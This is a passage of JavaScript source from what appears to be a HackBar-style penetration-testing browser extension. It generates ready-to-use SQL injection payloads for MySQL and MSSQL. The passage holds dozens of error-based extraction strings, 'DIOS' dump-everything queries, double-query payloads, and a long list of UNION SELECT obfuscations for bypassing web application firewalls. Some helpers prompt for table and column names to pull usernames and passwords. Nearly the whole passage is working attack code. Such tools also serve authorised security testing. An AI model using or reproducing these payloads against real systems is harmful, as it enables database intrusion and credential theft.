				txt = txt.replace(/\/\*\&a\=\*\//g, "+");
				txt = txt.replace(/ /g, "+");
					break;
			case '2': txt = txt.replace(/\+/g, "/**/");
				txt = txt.replace(/\/\*\&a\=\*\//g, "/**/");
				txt = txt.replace(/ /g, "/**/");
					break;
			case '3': txt = txt.replace(/\+/g, " ");
				txt = txt.replace(/\/\*\*\//g, " ");
				txt = txt.replace(/ /g, " ");
					break;
		}
		hackBar.setSelectedText( txt );
	},
	/* ERROR BASED FUNCTION */
      ErrorBased: function (choice)	{
		var str = choice;
		switch (str){
			case 'ErrorBased1': txt = "+OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1";
					break;
			case 'ErrorBased2': txt = "+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";
					break;
            case 'ErrorBased3':
					var dbName = prompt("Database Name", "DATABASE()");
                    var dbNameFinal = "0x";
                    if(dbName == "DATABASE()"){dbNameFinal="DATABASE()";}
                    else{
                        for (var i = 0; i < dbName.length; i++){
                          dbNameFinal += dbName.charCodeAt(i).toString(16);
                        }
                    }
					txt = "+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=" + dbNameFinal + "+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";
                    break;
            case 'ErrorBased4':
					var dbName = prompt("Database Name","DATABASE()");
                    var dbNameFinal = "0x";
                    if(dbName == "DATABASE()"){dbNameFinal="DATABASE()";}
                    else{
                        for (var i = 0; i < dbName.length; i++){
                          dbNameFinal += dbName.charCodeAt(i).toString(16);
                        }
                    }
                    var tableName = prompt("Table Name", "users");
                    var tblNameHexed = '';
                    for(var i=0;i<tableName.length;i++) {
                        tblNameHexed += ''+tableName.charCodeAt(i).toString(16);
                    }
					txt = "+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x" + tblNameHexed + "+AND+table_schema=" + dbNameFinal + "+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";
                    break;
			case 'ErrorBased5':
					var Db = prompt("Database Name","DATABASE()");
                    var tableName = prompt("Table Name", "users");
					if(Db == ""){dbANDtable=tableName;}
					if(Db == "DATABASE()"){dbANDtable=tableName;}
					else{
					dbANDtable=Db + "." + tableName;
					}
                    var columnName = prompt("Column Name", "password");
                    txt = "+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(" + columnName + ")+AS+CHAR),0x7e))+FROM+" + dbANDtable + "+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)";
                    break;
			/*MOD's By r0ot@H3X49 Advance Error based*/
			/*Error Based for MySQL Version < 5.5 */
			case 'POLYGON1':
					txt = "+POLYGON((Select*from(Select*from(Select+@@version ``)y)x))";
					break;
			case 'POLYGON2':
					txt = "+POLYGON((select*from(select*from(select+group_concat(table_name+separator+0x3c62723e)+from+information_schema.tables+where+table_schema=database())f)x))";
					break;
			/*Error Based for MySQL Version 5.5 , 5.6 ...  / Maria_db*/
			case 'Advance Error Based1':
					txt = "and(select!x-~0.+from(select(select+group_concat(Version()))x)x)";
					break;
			case 'Advance Error Based2':
					txt = "and(select!x-~0.+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())x)x)";
					break;
			/*DIOS By MadBlood for MySQL Version 5.5 , 5.6 ...  / Maria_db*/
			case 'DIOS By MadBlood1':
					txt = "(select+x*1E308+from(select+concat(@:=0,(select+count(*)from+information_schema.tables+where+table_schema=database()and@:=concat(@,0x0b,table_name)),@)x)y)";
					break;
			case 'DIOS By MadBlood2':
					txt = "(select(x+is+not+null)-9223372036854775808+from(select(concat(@:=0,(select+count(*)from+information_schema.tables+where+table_schema=database()and@:=concat(@,0x0b,table_name)),@))x)y)";
					break;
			case 'DIOS By MadBlood3':
					txt = "(select!x-~0+from(select+concat(@:=0,(select(count(*))from(information_schema.tables)where(table_schema=database())and@:=concat(@,0x0b,table_name)),@)x)y)";
					break;
			case 'DIOS By MadBlood4':
					txt = "(select+if(x,6,9)*1E308+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())x)x)";
					break;
			case 'DIOS By MadBlood5':
					txt = "(select!x-~0.+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())x)x)";
					break;
			case 'DIOS By MadBlood6':
					txt = "(select(!root-~0)from(select concat/**/(user(),version(),database(),0x3c62723e,@:=0,(select+count(*)+from+information_schema.columns where table_schema=database() and @:=concat/**/(@,table_name,0x3a3a3a3a3a,column_name,0x3c62723e)),@)root)z)";
					break;
			case 'DIOS By MadBlood7':
					txt = "and(select(!root-~0)from(select concat/**/(user(),version(),database(),0x3c62723e,@:=0,(select+count(*)+from+information_schema.columns where table_schema=database() and @:=concat/**/(@,table_name,0x3a3a3a3a3a,column_name,0x3c62723e)),@)root)z)";
					break;
			case 'DIOS By MadBlood8':
					txt = "and(select+if(x,6,9)*1E308+from(select(select+group_concat(table_name+separator+0x0b)from+information_schema.tables+where+table_schema=database())x)x)";
					break;
			case 'DIOS By MadBlood9':
					txt = "and(select+x*1E308+from(select+concat(@:=0,(select+count(*)from+information_schema.tables+where+table_schema=database()+and@:=concat(@,0x0b,table_name)),@)x)y)";
					break;
			/*DIOS By MadBlood for MySQL Version < 5.5 */
			case 'MULTIPIONT1':
					txt = "+multipoint((select*from+(select+x*1E308+from+(select+concat(@:=0,(select+count(*)+from+information_schema.tables+where+table_schema=database()+and@:=concat(@,0x0b,table_name)),@)x)y)j))";
					break;
			case 'MULTIPIONT2':
					txt = "+multipoint((select*from(select(!x-~0)+from(select+concat(@:=0,(select(count(*))from(information_schema.tables)where(table_schema=database())and@:=concat(@,0x0b,table_name)),@)x)y)j))";
					break;
			case 'MULTIPIONT3':
					txt = "multipoint((select*from(select(x+is+not+null)-9223372036854775808+from+(select(concat(@:=0,(select+count(*)+from+information_schema.tables+where+table_schema=database()+and@:=concat(@,0x0b,table_name)),@))x)y)j))";
					break;
			case 'MULTIPIONT4':
					txt = "'+and+multipoint((select*from(select!x-~0.from(select(select+group_concat(table_name+separator+0x0b)from(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+1,20)c)x)j)h))";
					break;
			case '23':
					txt = " and extractvalue(0x0a,concat(0x0a,(select version())))";
					break;
			case '24':
					txt = " and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))";
					break;
			case '25':
					var dbName = prompt("Database Name","DATABASE()");
                    var dbNameFinal = "0x";
                    if(dbName == "DATABASE()"){dbNameFinal="DATABASE()";}
                    else{
                        for (var i = 0; i < dbName.length; i++){
                          dbNameFinal += dbName.charCodeAt(i).toString(16);
                        }
                    }
                    var tableName = prompt("Table Name", "table_name");
                    var tblNameHexed = "0x";
                    for(var i=0;i<tableName.length;i++) {
                        tblNameHexed += tableName.charCodeAt(i).toString(16);
                    }
					txt = " and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=" + dbNameFinal +" and table_name=" + tblNameHexed + " limit 0,1)))";
					break;
			case '26':
					var Db = prompt("Database Name","DATABASE()");
                    var tableName = prompt("Table Name", "users");
					if(Db == ""){dbANDtable=tableName;}
					if(Db == "DATABASE()"){dbANDtable=tableName;}
					else{
					dbANDtable=Db + "." + tableName;
					}
                    var columnName = prompt("Column Name", "username,password");
                    txt = " and extractvalue(0x0a,concat(0x0a,(select concat(" + columnName + ") from " + dbANDtable + " limit 0,1)))";
					break;
			case '27':
					txt = " and updatexml(null,concat(0x0a,(select version())),null)";
					break;
			case '28':
					txt = " and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),null)";
					break;
			case '29':
					var dbName = prompt("Database Name","DATABASE()");
                    var dbNameFinal = "0x";
                    if(dbName == "DATABASE()"){dbNameFinal="DATABASE()";}
                    else{
                        for (var i = 0; i < dbName.length; i++){
                          dbNameFinal += dbName.charCodeAt(i).toString(16);
                        }
                    }
                    var tableName = prompt("Table Name", "table_name");
                    var tblNameHexed = "0x";
                    for(var i=0;i<tableName.length;i++) {
                        tblNameHexed += tableName.charCodeAt(i).toString(16);
                    }
					txt = " and updatexml(null,concat(0x0a,(select column_name from information_schema.columns where table_schema=" + dbNameFinal +" and table_name=" + tblNameHexed + " limit 0,1)),null)";
					break;
			case '30':
					var Db = prompt("Database Name","DATABASE()");
                    var tableName = prompt("Table Name", "users");
					if(Db == ""){dbANDtable=tableName;}
					if(Db == "DATABASE()"){dbANDtable=tableName;}
					else{
					dbANDtable=Db + "." + tableName;
					}
                    var columnName = prompt("Column Name", "username,password");
                    txt = " and updatexml(null,concat(0x0a,(select concat(" + columnName + ") from " + dbANDtable + " limit 0,1)),null)";
					break;
					/*MSSQL ERROR BASED*/
			case '31':
					txt = " and 1=@@version()";
					break;
			case '32':
					txt = " and 1=db_name()";
					break;
			case '33':
					txt = " and 1=user";
					break;
			case '34':
					txt = " and 1=(select+table_name%2b'::'%2bcolumn_name as t+from+information_schema.columns FOR XML PATH(''))";
					break;
			default:
                    txt = "ERROR";
                    break;
					
			case 'x1':
					txt = "and extractvalue(0x0a,concat(0x0a,(select version())))";
					break;
			case 'x2':
					txt = "and extractvalue(0x0a,concat(0x0a,(select database())))";
					break;		
			case 'x3':
					txt = "and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))";
					break;
			case 'x4':
					var dbName = prompt("Database Name","DATABASE()");
                    var dbNameFinal = "0x";
                    if(dbName == "DATABASE()"){dbNameFinal="DATABASE()";}
                    else{             
                        for (var i = 0; i < dbName.length; i++){
                          dbNameFinal += dbName.charCodeAt(i).toString(16);
                        }
                    }
                    var tableName = prompt("Table Name", "table_name");                
                    var tblNameHexed = "0x";
                    for(var i=0;i<tableName.length;i++) {
                        tblNameHexed += tableName.charCodeAt(i).toString(16);
                    }
					txt = "and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=" + dbNameFinal +" and table_name=" + tblNameHexed + " limit 0,1)))";
					break;
			case 'x5':
					var Db = prompt("Database Name","DATABASE()");
                    var tableName = prompt("Table Name", "users");
					if(Db == ""){dbANDtable=tableName;}
					if(Db == "DATABASE()"){dbANDtable=tableName;}
					else{
					dbANDtable=Db + "." + tableName;					
					}
                    var columnName = prompt("Column Name", "username,password");
                    txt = "and extractvalue(0x0a,concat(0x0a,(select concat(" + columnName + ") from " + dbANDtable + " limit 0,1)))";
					break;
			case 'x6':
					txt = "and updatexml(null,concat(0x0a,(select version())),null)";
					break;
			case 'x7':
					txt = "and updatexml(null,concat(0x0a,(select database())),null)";
					break;		
			case 'x8':
					txt = "and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),null)";
					break;
			case 'x9':
					var dbName = prompt("Database Name","DATABASE()");
                    var dbNameFinal = "0x";
                    if(dbName == "DATABASE()"){dbNameFinal="DATABASE()";}
                    else{             
                        for (var i = 0; i < dbName.length; i++){
                          dbNameFinal += dbName.charCodeAt(i).toString(16);
                        }
                    }
                    var tableName = prompt("Table Name", "table_name");                
                    var tblNameHexed = "0x";
                    for(var i=0;i<tableName.length;i++) {
                        tblNameHexed += tableName.charCodeAt(i).toString(16);
                    }
					txt = "and updatexml(null,concat(0x0a,(select column_name from information_schema.columns where table_schema=" + dbNameFinal +" and table_name=" + tblNameHexed + " limit 0,1)),null)";
					break;
			case 'x10':
					var Db = prompt("Database Name","DATABASE()");
                    var tableName = prompt("Table Name", "users");
					if(Db == ""){dbANDtable=tableName;}
					if(Db == "DATABASE()"){dbANDtable=tableName;}
					else{
					dbANDtable=Db + "." + tableName;					
					}
                    var columnName = prompt("Column Name", "username,password");
                    txt = "and updatexml(null,concat(0x0a,(select concat(" + columnName + ") from " + dbANDtable + " limit 0,1)),null)";
					break;			
					
					
		}
		hackBar.setSelectedText( txt );
	},
	/* UNION SELECT WAF Bypass*/
	  UnionWaf: function (choice){				
		var str = choice;
		switch (str){
			//Union Select Cheat sheet Waff Bypass
		case '7':
						txt = "+union+distinct+select+";
					break;
			case '8':
						txt = "+union+distinctROW+select+";
					break;
			case '9':
						txt = "+/*!50000UnIoN*/ /*!50000SeLeCt aLl*/+";
					break;
			case '10':
						txt = "+/*!u%6eion*/+/*!se%6cect*/+";
					break;
			case '11':
						txt = "/*!50000%55nIoN*/+/*!50000%53eLeCt*/";
					break;
			case '12':
						txt = "union /*!50000%53elect*/";
					break;
			case '13':
						txt = "+%55nion %53elect+";
					break;
			case '14':
						txt = "+UnIOn%0d%0aSeleCt%0d%0a+";
					break;
			case '15':
						txt = "id=1+?UnI?On?+'SeL?ECT?";
					break;
			case '16':
						txt = "id=1+'UnI'||'on'+SeLeCT'";
					break;
			case '17':
						txt = "uNiOn aLl sElEcT";
					break;
			case '18':
						txt = "uUNIONnion all sSELECTelect";
					break;
			case '19':
						txt = "un/**/ion+sel/**/ect";
					break;
			case '20':
						txt = "+#1q%0Aunion all#qa%0A#%0Aselect";
					break;
			case '21':
						txt = "union /*!select*/+";
					break;
			case '22':
						txt = "union/**/select/**/";
					break;
			case '23':
						txt = "%23xyz%0AUnIOn%23xyz%0ASeLecT+";
					break;
			case '24':
						txt = "%23xyz%0A%55nIOn%23xyz%0A%53eLecT+";
					break;
			case '25':
						txt = "/union\sselect/g";
					break;
			case '26':
						txt = "/union\s+select/i";
					break;
			case '27':
						txt = "/*!UnIoN*/SeLeCT";
					break;
			case '28':
						txt = "+uni%0bon+se%0blect+";
					break;
			case '29':
						txt = "+uni>on+sel>ect+";
					break;
			case '30':
						txt = "+(UnIoN)+(SelECT)+";
					break;
			case '31':
						txt = "+(UnI)(oN)+(SeL)(EcT)";
					break;
			case '32':
						txt = "+?UnI?On?+'SeL?ECT?";
					break;
			case '33':
						txt = "+uni on+sel ect+";
					break;
			case '34':
						txt = "+/*!UnIoN*/+/*!SeLeCt*/+";
					break;
			case '35':
						txt = "/*!u%6eion*/ /*!se%6cect*/";
					break;
			case '36':
						txt = "/^.*union.*$/ /^.*select.*$/";
					break;
			case '37':
						txt = "/*union*/union/*select*/select+";
					break;
			case '38':
						txt = "/*uni X on*/union/*sel X ect*/";
					break;
			case '39':
						txt = "+un/**/ion+sel/**/ect+";
					break;
			case '40':
						txt = "+unio%6e %73elect+";
					break;
			case '41':
						txt = "+UNunionION+SEselectLECT+";
					break;
			} 		
		hackBar.setSelectedText( txt );
	  },
	/* DOUBLE QUERY FUNCTION */
    DoubleQuery: function (choice)	{
		var str = choice;
		switch (str){
            case 'DoubleQuery1':
                    txt = "+AND(SELECT+1+FROM(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+CONCAT(CAST(VERSION()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1";
                    break;
            case 'DoubleQuery2':
                    txt = "+AND(SELECT+1+from(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+(SELECT+DISTINCT+CONCAT(0x7e,0x27,CAST(schema_name+AS+CHAR),0x27,0x7e)+FROM+INFORMATION_SCHEMA.SCHEMATA+WHERE+table_schema!=DATABASE()+LIMIT+1,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),+FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1";
                    break;
            case 'DoubleQuery3':
                    var dbName = prompt("Database Name","DATABASE()");
                    var dbNameFinal = "0x";
                    if(dbName == "DATABASE()"){dbNameFinal="DATABASE()";}
                    else{
                        for (var i = 0; i < dbName.length; i++){
                          dbNameFinal += dbName.charCodeAt(i).toString(16);
                        }
                    }
                    txt = "+AND(SELECT+1+from(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+(SELECT+DISTINCT+CONCAT(0x7e,0x27,CAST(table_name+AS+CHAR),0x27,0x7e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=" + dbNameFinal + "+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1";
                    break;
            case 'DoubleQuery4':
                    var dbName = prompt("Database Name","DATABASE()");
                    var dbNameFinal = "0x";
                    if(dbName == "DATABASE()"){dbNameFinal="DATABASE()";}
                    else{
                        for (var i = 0; i < dbName.length; i++){
                          dbNameFinal += dbName.charCodeAt(i).toString(16);
                        }
                    }
                    var tblName = prompt("Table Name", "users");
                    var tblNameHex = "";
                    for (var i = 0; i < tblName.length; i++){
                      tblNameHex += tblName.charCodeAt(i).toString(16);
                    }
                    txt = "+AND(SELECT+1+FROM(SELECT+COUNT(*),CONCAT((SELECT+(SELECT+(SELECT+DISTINCT+CONCAT(0x7e,0x27,CAST(column_name+AS+CHAR),0x27,0x7e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_schema=" + dbNameFinal + "+AND+table_name=0x" + tblNameHex + "+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1";
                    break;
            default:
                    txt = "ERROR";
                    break;
			case 'DoubleQuery5':

                    var Db = prompt("Database Name","DATABASE()");
                    var tableName = prompt("Table Name", "users");
					if(Db == ""){dbANDtable=tableName;}
					if(Db == "DATABASE()"){dbANDtable=tableName;}
					else{
					dbANDtable=Db + "." + tableName;
					}
                    var columnName = prompt("Column Name", "password");

                    txt = "+AND(SELECT+1+FROM(SELECT+count(*),CONCAT((SELECT+(SELECT+(SELECT+CONCAT(0x7e,0x27,cast(" + columnName +"+AS+CHAR),0x27,0x7e)+FROM+" + dbANDtable + "+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1=1";
                    break;
        }
		hackBar.setSelectedText( txt );
	  },
  /*# Generate Union Select 1111,2222,3333,4444 FIX!!! BY PH.HITACHI #*/
   UnionSelect1111: function ( encoding )
  {
    var columns = prompt( "Amount of columns to use in the UNION SELECT 1111,2222,3333,4444 ", "10" );
    columns = Math.min(1000, parseInt( columns ));
	    var repeat = prompt( "Amount of Number Repeat ", "4" );
	    repeat = Math.min(1000, parseInt( repeat ));
    var colArray = new Array();
    for(var i = 0; i < columns; i ++ ) {
    var push = String(i+1)
    var txt = new Array();
    for( x = 0; x < repeat; x ++ ) {
      txt += push
    }
    colArray.push( txt )
    }
    switch ( encoding )
    {
      case "1": 
      	 txt = "Union Select " + colArray.join(',');
        break;
      case "2": var result = colArray.join( '),(' );
		 txt = "+UNION(SELECT(" + result + "))";
        break;
       }//
    hackBar.setSelectedText( txt );
  },
  UnionSelect1111tojoinselect :function ( encoding ){
  	var columns = prompt( "Amount of columns to use in the UNION SELECT 1111,2222,3333,4444 ", "10" );
    	columns = Math.min(1000, parseInt( columns ));
	var repeat = prompt( "Amount of Number Repeat ", "4" );
	    repeat = Math.min(1000, parseInt( repeat ));
  	var colArray = new Array();
		var abc = [
		'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm','n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
		'aa', 'bb', 'cc', 'dd', 'ee', 'ff', 'gg', 'hh', 'ii', 'jj', 'kk', 'll', 'mm','nn', 'oo', 'pp', 'qq', 'rr', 'ss', 'tt', 'uu', 'vv', 'ww', 'xx', 'yy', 'zz',
		'aaa', 'bbb', 'ccc', 'ddd', 'eee', 'fff', 'ggg', 'hhh', 'iii', 'jjj', 'kkk', 'lll', 'mmm','nnn', 'ooo', 'ppp', 'qqq', 'rrr', 'sss', 'ttt', 'uuu', 'vvv', 'www', 'xxx', 'yyy', 'zzz',
		'aaaa', 'bbbb', 'cccc', 'dddd', 'eeee', 'ffff', 'gggg', 'hhhh', 'iiii', 'jjjj', 'kkkk', 'llll', 'mmmm','nnnn', 'oooo', 'pppp', 'qqqq', 'rrrr', 'ssss', 'tttt', 'uuuu', 'vvvv', 'wwww', 'xxxx', 'yyyy', 'zzz',
		'aaaaa', 'bbbbb', 'ccccc', 'ddddd', 'eeeee', 'fffff', 'ggggg', 'hhhhh', 'iiiii', 'jjjjj', 'kkkkk', 'lllll', 'mmmmm','nnnnn', 'ooooo', 'ppppp', 'qqqqq', 'rrrrr', 'sssss', 'ttttt', 'uuuuu', 'vvvvv', 'wwwww', 'xxxxx', 'yyyyy', 'zzzz'
		];	
		var colArray = new Array();
	    for(var i = 0; i < columns; i ++ ) {
	    var push = String(i+1)
	    var txt = new Array();
	    for( x = 0; x < repeat; x ++ ) {
	      txt += push
	    }
	    colArray.push(`${txt})` + abc[i]) //FIXX!!!
	    }
		txt = 'Union Select * from (select ' + colArray.join(' join(select ');;
    hackBar.setSelectedText( txt );
  },
    UnionSelectbuff: function ( encoding )
  {
    var columns = prompt( "Amount of columns to use in the UNION SELECT Statement", "10" );
    columns = Math.min(1000, parseInt( columns ));
    var colArray = new Array();
    for ( var i = 0 ; i < columns ; i++ ) {
      colArray.push( i+1 );
    }
    switch ( encoding )
    {
      case "buff": 
      var buff = "";
			stringLength = prompt("Length of the string to use in the Buffer overflow:", "1337");
			stringLength = Math.min(4096, parseInt(stringLength, 10));
		
		for (var i = 0; i < stringLength; i++) {
			buff += "a";
		}
			var txt = "%23%0AUnion%23"+buff+"%0ASelect%23%0A"+ colArray.join(',');
        break;
    }
    hackBar.setSelectedText( txt );
  },
 /* join select query */
 UniontoJoinSelect: function ( encoding )
  {
  	var columns = prompt( "Amount of columns to use in the join(SELECT 1)a join(SELECT 2)b statement maximunm of 100", "10" );
  	columns = Math.min(100, parseInt( columns ));
  	var colArray = new Array();
	var abc = [
	'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm','n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
	'aa', 'bb', 'cc', 'dd', 'ee', 'ff', 'gg', 'hh', 'ii', 'jj', 'kk', 'll', 'mm','nn', 'oo', 'pp', 'qq', 'rr', 'ss', 'tt', 'uu', 'vv', 'ww', 'xx', 'yy', 'zz',
	'aaa', 'bbb', 'ccc', 'ddd', 'eee', 'fff', 'ggg', 'hhh', 'iii', 'jjj', 'kkk', 'lll', 'mmm','nnn', 'ooo', 'ppp', 'qqq', 'rrr', 'sss', 'ttt', 'uuu', 'vvv', 'www', 'xxx', 'yyy', 'zzz',
	'aaaa', 'bbbb', 'cccc', 'dddd', 'eeee', 'ffff', 'gggg', 'hhhh', 'iiii', 'jjjj', 'kkkk', 'llll', 'mmmm','nnnn', 'oooo', 'pppp', 'qqqq', 'rrrr', 'ssss', 'tttt', 'uuuu', 'vvvv', 'wwww', 'xxxx', 'yyyy', 'zzz',
	'aaaaa', 'bbbbb', 'ccccc', 'ddddd', 'eeeee', 'fffff', 'ggggg', 'hhhhh', 'iiiii', 'jjjjj', 'kkkkk', 'lllll', 'mmmmm','nnnnn', 'ooooo', 'ppppp', 'qqqqq', 'rrrrr', 'sssss', 'ttttt', 'uuuuu', 'vvvvv', 'wwwww', 'xxxxx', 'yyyyy', 'zzzz'
	];	
	var txt = [], i = 0;
	for(i; i < columns; i++) 
    	txt.push(`${i+1})`+abc[i]); //FIXX!!!
	txt = 'Union Select * from (select ' + txt.join(' join(select ');
    hackBar.setSelectedText( txt );
  },//*


   UnionToSQLChar: function ( encoding ){
	var columns = prompt( "Amount of columns to use in the Union Select CHAR(49),CHAR(50),CHAR(51) Statement", "10" );
	columns = Math.min(100, parseInt( columns ));
	var number = ['CHAR(49)','CHAR(50)','CHAR(51)','CHAR(52)','CHAR(53)','CHAR(54)','CHAR(55)','CHAR(56)','CHAR(57)','CHAR(49) + CHAR(48)',' CHAR(49) + CHAR(49)',' CHAR(49) + CHAR(50)',' CHAR(49) + CHAR(51)',' CHAR(49) + CHAR(52)',' CHAR(49) + CHAR(53) ',' CHAR(49) + CHAR(54)',' CHAR(49) + CHAR(55)',' CHAR(49) + CHAR(56)',' CHAR(49) + CHAR(57)',' CHAR(50) + CHAR(48)',' CHAR(50) + CHAR(49)',' CHAR(50) + CHAR(50) ',' CHAR(50) + CHAR(51)',' CHAR(50) + CHAR(52)',' CHAR(50) + CHAR(53)',' CHAR(50) + CHAR(54)',' CHAR(50) + CHAR(55)',' CHAR(50) + CHAR(56)',' CHAR(50) + CHAR(57)',' CHAR(51) + CHAR(48)',' CHAR(51) + CHAR(49)',' CHAR(51) + CHAR(50) ',' CHAR(51) + CHAR(51)',' CHAR(51) + CHAR(52)',' CHAR(51) + CHAR(53)',' CHAR(51) + CHAR(54)',' CHAR(51) + CHAR(55) ',' CHAR(51) + CHAR(56)',' CHAR(51) + CHAR(57)',' CHAR(52) + CHAR(48)',' CHAR(52) + CHAR(49)',' CHAR(52) + CHAR(50)',' CHAR(52) + CHAR(51)',' CHAR(52) + CHAR(52)',' CHAR(52) + CHAR(53)',' CHAR(52) + CHAR(54)',' CHAR(52) + CHAR(55)',' CHAR(52) + CHAR(56)',' CHAR(52) + CHAR(57)',' CHAR(53) + CHAR(48)'];
	var txt = [];
	var i;
	   for (var i = 0; i < columns; i++) {
	  		txt.push(number[i]);
	    }
    hackBar.setSelectedText( "Union Select " + txt );
  },
  /*/
	/* SELECT QUERIES */
    SelectQueries: function (choice)	{
		var str = choice;
		switch (str){
//BASIC STATEMENT
			case 'Basic statements1':  txt = "(SELECT+CONCAT(COUNT(schema_name),0x202f20446174616261736573)+FROM+INFORMATION_SCHEMA.SCHEMATA)";
					break;
//DATA BASE
			case 'Databases1':  txt = "(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x)";			
					break;			
			case 'Databases2':					
                    txt = "(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)";
                    break;

            case 'Databases3':					
                    txt = "(select group_Concat(0x3c62723e,table_schema) from {f information_schema.tables} where table_name = 'admin')";
                    break;	
		    case 'Databases4':					
                    txt = "(select /*!50000group_Concat(*/table_schema) from {f information_schema.tables} where table_name = 'admin')";
                    break;
//TABLES
			case 'Tables2':					
                    txt = "(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,table_name,0x3c62723e))))x)";
                    break;
					
			case 'Tables3':					
                    txt = "concat(0x636f756e743a20, (Select count(0) from admin))";
                    break;
// WAF-SETS
			case 'WAF-SETS1':
                    txt = "(/*!%53ELECT*/+/*!50000GROUP_CONCAT(table_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.TABLES*//**//*!%57HERE*//**//*!TABLE_SCHEMA*//**/LIKE/**/DATABASE())";
                    break;
			case 'WAF-SETS2':
					var tblName = prompt("Table Name", "users");
                    var tblNameHex = "";
                    for (var i = 0; i < tblName.length; i++){
                      tblNameHex += tblName.charCodeAt(i).toString(16);
                    }
                    txt = "(/*!%53ELECT*/+/*!50000GROUP_CONCAT(column_name%20SEPARATOR%200x3c62723e)*//**//*!%46ROM*//**//*!INFORMATION_SCHEMA.COLUMNS*//**//*!%57HERE*//**//*!TABLE_NAME*//**/LIKE/**/0x" + tblNameHex + ")";
                    break;
			case 'WAF-SETS3':
                    txt = "(/*!%53ELECT*/(@x)FROM(/*!%53ELECT*/(@x:=0x00),(@NR:=0),(/*!%53ELECT*/(0)/*!%46ROM*/(/*!%49NFORMATION_%53CHEMA*/./*!%54ABLES*/)/*!%57HERE*/(/*!%54ABLE_%53CHEMA*//**/NOT/**/LIKE/**/0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=/*!CONCAT%0a(*/@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,/*!%74able_%6eame*/,0x3c62723e))))x)";
                    break;
			case 'WAF-SETS4':
					var tblName = prompt("Table Name", "users");
                    var tblNameHex = "";
                    for (var i = 0; i < tblName.length; i++){
                      tblNameHex += tblName.charCodeAt(i).toString(16);
                    }
